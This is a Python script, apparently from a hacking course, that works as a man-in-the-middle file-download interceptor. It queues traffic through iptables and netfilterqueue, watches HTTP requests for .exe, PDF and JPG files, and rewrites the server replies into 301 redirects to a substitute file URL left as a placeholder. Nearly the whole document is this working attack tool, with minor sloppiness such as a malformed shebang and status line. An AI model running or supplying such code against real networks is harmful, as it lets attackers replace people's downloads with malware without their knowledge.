#!usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import subprocess


ack_list = []


def set_load(packet, load):
    print("[+] Replacing file")
    # just an example for location of desired site
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def queue_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP]:
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in scapy_packet[scapy.Raw].load:
                    print("[+] exe Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                elif "pdf" in scapy_packet[scapy.Raw].load:
                    print("[+] pdf Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                elif ".jpg" in scapy_packet[scapy.Raw].load:
                    print("[+] image JPG Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                '''And other files can be replaced too'''

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    #file can be sent through apache server
                    url = "HTTP /1.1 301 Moved Permanently\nLocation: file_url_to_modify\n\n"   #add url
                    set_load(scapy_packet, url)

                    packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, queue_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Resetting and Exciting")
    subprocess.call("iptables --flush", shell=True)
